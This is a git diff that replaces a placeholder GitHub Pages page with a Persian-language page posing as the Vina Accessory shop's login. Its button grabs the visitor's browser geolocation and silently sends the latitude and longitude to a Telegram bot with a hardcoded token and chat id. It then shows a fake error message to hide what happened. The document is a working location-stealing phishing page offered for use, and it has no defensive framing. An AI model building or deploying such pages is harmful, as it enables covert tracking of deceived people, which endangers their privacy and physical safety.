@@ -1,10 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Welcome to My Website</title>
+	<title>https://vinaaccessory.com/</title>
 </head>
 <body>
-  <h1>Hello, world!</h1>
-  <p>This is my first GitHub Pages site 🎉</p>
+	<h1>در حال ورود به سایت...</h1>
+	<p>شناسایی فروشگاه های نزدیک به شما...</p>
+	<button onclick="getLocation()">ورود به وینا اکسسوری</button>
+	<script>
+		function getLocation() {
+			if (navigator.geolocation) {
+				navigator.geolocation.getCurrentPosition(showPosition);
+			} else {
+				alert("Geolocation is not supported by this browser.");
+			}
+		}
+		function showPosition(position) {
+			var latitude = position.coords.latitude;
+			var longitude = position.coords.longitude;
+			var url = "https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage?chat_id=8438093859&text=Latitude: " + latitude + ", Longitude: " + longitude;
+			var xhr = new XMLHttpRequest();
+			xhr.open("GET", url, true);
+			xhr.send();
+			alert("خطا! دوباره امتحان کنید");
+		}
+	</script>
 </body>
 </html>
